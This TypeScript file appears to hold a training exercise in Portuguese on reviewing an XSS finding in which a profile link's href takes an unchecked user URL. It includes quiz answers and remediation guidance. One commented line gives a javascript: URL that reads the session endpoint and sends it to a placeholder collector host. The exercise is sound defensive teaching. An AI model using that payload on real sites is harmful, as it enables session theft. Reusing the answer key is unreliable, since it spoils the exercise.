import type { ReviewSample } from './types'

export const linkDoPerfil: ReviewSample = {
  id: 'link-do-perfil',
  title: 'Link do perfil com a URL que o usuário digitou',
  subtitle: 'Treinar o ponto cego das regras de XSS: o atributo que recebe URL, e não o corpo do elemento.',
  area: 'web',
  level: 'Intermediário',
  minutes: 9,
  finding: {
    tool: 'Varredura estática (ferramenta fictícia)',
    rule: 'XSS-021 · valor dinâmico em atributo de link',
    severity: 'média',
    line: 9,
    message: 'Atributo href recebe valor dinâmico. Verifique o esquema da URL antes de usar.',
    confidence: 'baixa',
  },
  context: [
    'O perfil público permite que a pessoa informe o endereço do próprio site. O campo é livre e aparece como link clicável para qualquer visitante.',
    'A equipe considera o alerta pouco importante: a confiança declarada pela ferramenta é baixa e o texto do link usa `textContent`.',
  ],
  file: 'src/perfil/cartao.tsx',
  language: 'ts',
  code: [
    'export function CartaoDePerfil({ perfil }: { perfil: Perfil }) {',
    '  const nome = perfil.nome.trim()',
    '  return (',
    '    <article className="cartao">',
    '      <h2>{nome}</h2>',
    '      <p>{perfil.bio}</p>',
    '      {perfil.site ? (',
    '        <a',
    '          href={perfil.site}',
    '          target="_blank"',
    '          rel="noreferrer"',
    '        >',
    '          {perfil.site}',
    '        </a>',
    '      ) : null}',
    '    </article>',
    '  )',
    '}',
  ],
  extra: {
    title: 'Validação do campo no cadastro (servidor)',
    language: 'ts',
    lines: [
      'const perfilSchema = z.object({',
      '  nome: z.string().min(1).max(80),',
      '  bio: z.string().max(400),',
      '  site: z.string().max(200).optional(), // comprimento apenas',
      '})',
      '',
      '// exemplos aceitos hoje pelo cadastro:',
      '//   https://pessoa.example',
      '//   javascript:fetch("/api/sessao").then(r=>r.text()).then(t=>new Image().src="https://coletor.example/?t="+t)',
    ],
    note: 'O que o servidor aceita guardar no campo `site`.',
  },
  verdict: 'procede',
  verdictFeedback: [
    'Correto. O valor vai direto para `href` e o cadastro só limita o comprimento: uma URL com esquema `javascript:` é aceita, guardada e vira link executável para quem clicar no perfil.',
    'O texto do link estar escapado não protege o atributo: a execução vem do esquema da URL, e não do conteúdo mostrado.',
    'O trecho e a validação do servidor já mostram tudo o que importa: origem do valor, ausência de verificação de esquema e o ponto de uso.',
  ],
  verdictHints: [
    'Pergunte quais esquemas de URL o campo aceita hoje.',
    'O framework escapa o conteúdo do elemento. E o atributo?',
    'Confiança baixa da ferramenta não é o mesmo que risco baixo.',
  ],
  verdictExplain:
    'Frameworks de interface escapam o texto, mas não decidem se uma URL é segura. Com `javascript:` no `href`, o clique executa script na origem do site, com a sessão da vítima. A validação atual só limita o tamanho do campo.',
  signals: [
    { text: 'O valor de `perfil.site` chega ao atributo `href` sem nenhuma verificação de esquema.', feedback: 'Sim: é o ponto da falha, porque o esquema é justamente o que decide se o clique navega ou executa.' },
    { text: 'A validação do servidor limita apenas o comprimento do campo.', feedback: 'Sim: nada impede guardar uma URL com esquema perigoso.' },
    { text: 'O exemplo aceito pelo cadastro inclui uma URL `javascript:` que lê a sessão.', feedback: 'Sim: demonstra o efeito concreto, não apenas a possibilidade teórica.' },
    { text: 'O link abre em nova aba com `rel="noreferrer"`.', feedback: 'Não: isso trata o vazamento de referência e o acesso à janela de origem, não o esquema da URL.' },
    { text: 'O texto do link é renderizado como conteúdo, e portanto escapado.', feedback: 'Não: o conteúdo escapado é irrelevante quando o problema está no atributo.' },
  ],
  correctSignals: [0, 1, 2],
  signalPrompt: 'Marque **todos** os sinais que sustentam o veredito de que o achado procede.',
  signalHints: [
    'Separe o que protege o conteúdo do que protegeria o atributo.',
    'Procure onde o esquema da URL seria verificado — e não está.',
    'Dois itens descrevem boas práticas que não tratam deste risco.',
  ],
  signalExplain:
    'A falha está no atributo: o valor vira `href` sem que ninguém verifique o esquema, e o cadastro aceita guardar qualquer texto curto. `rel="noreferrer"` e o escape do conteúdo são corretos e tratam outros problemas.',
  next: {
    prompt: 'O achado procede. Qual conduta trata o problema sem deixar rastro de meia-correção?',
    options: [
      {
        text: 'Validar o esquema no servidor, aceitando apenas `http` e `https` ao salvar, e também na renderização, descartando qualquer URL fora dessa lista; migrar os perfis já salvos com um script que limpe os valores inválidos; e registrar o achado com o teste que cobre `javascript:` e `data:`.',
        quality: 'best',
        flags: ['servidor', 'cliente', 'migracao'],
        feedback: 'Fecha a entrada e a saída, trata os dados que já estão no banco e deixa um teste que impede a volta por qualquer um dos dois caminhos.',
        consequence: 'Os perfis atuais ficam limpos, o campo passa a recusar esquemas perigosos e a renderização deixa de confiar no que já está salvo.',
      },
      {
        text: 'Validar o esquema apenas na renderização, deixando o cadastro como está.',
        quality: 'good',
        flags: ['cliente'],
        feedback: 'Impede a execução no ponto de uso, que é o que mais importa agora. Mas o banco segue acumulando valores perigosos, prontos para o próximo lugar que usar o campo.',
        consequence: 'O perfil fica seguro; um e-mail de resumo ou uma exportação que use o mesmo campo reabre o problema.',
      },
      {
        text: 'Bloquear no cadastro as URLs que comecem com `javascript:`, por comparação de texto.',
        quality: 'partial',
        feedback: 'Comparar o começo do texto deixa passar variações com espaços, maiúsculas e codificações; e nada trata o que já está salvo.',
        consequence: 'As tentativas óbvias param, variações passam e a renderização continua confiando no valor.',
      },
      {
        text: 'Rebaixar o achado para severidade informativa, já que a ferramenta declarou confiança baixa.',
        quality: 'poor',
        feedback: 'Confiança é a certeza da ferramenta sobre a detecção, não a gravidade da falha. Aqui a detecção está certa e o impacto é execução de script com a sessão da vítima.',
        consequence: 'O achado sai da fila de correção e a falha permanece aberta no perfil público.',
      },
    ],
    hints: [
      'Pense em todos os lugares que podem usar o campo `site`.',
      'O que já está salvo no banco também precisa de resposta.',
      'Lista de permitidos é mais segura que lista de proibidos.',
    ],
    explain:
      'A conduta completa trata entrada, saída e histórico: valida ao salvar, valida ao usar e limpa o que já foi gravado. Validar só na renderização é uma boa correção parcial; comparar o começo do texto é frágil; e rebaixar por confiança da ferramenta confunde detecção com impacto.',
  },
  closing:
    'O campo passou a aceitar apenas `http` e `https`, a renderização descarta o que estiver fora dessa lista e um script limpou os perfis já salvos.',
  review: {
    solution: [
      'O veredito é "procede": o valor do campo vai direto ao `href` e o cadastro só limita comprimento, então `javascript:` é aceito e executa no clique.',
      'Os sinais são a ausência de verificação de esquema, a validação por comprimento e o exemplo de URL aceita que lê a sessão.',
      'A conduta completa valida ao salvar e ao renderizar, migra os dados já gravados e deixa teste para `javascript:` e `data:`.',
    ],
    residual:
      'Mesmo com a lista de esquemas, continua possível apontar para um site hostil com `https`: a validação trata execução no próprio domínio, não a reputação do destino.',
    validation:
      'Tente salvar uma URL com `javascript:` e confirme a recusa; renderize um perfil com valor inválido vindo direto do banco e confirme que o link não aparece; e rode o script de migração em uma cópia, conferindo quantos perfis foram alterados.',
  },
  frameworks: [
    { framework: 'owasp-top10', id: 'A05' },
    { framework: 'cwe', id: 'CWE-79' },
    { framework: 'cwe', id: 'CWE-601' },
  ],
  tags: ['web', 'xss', 'procede'],
}
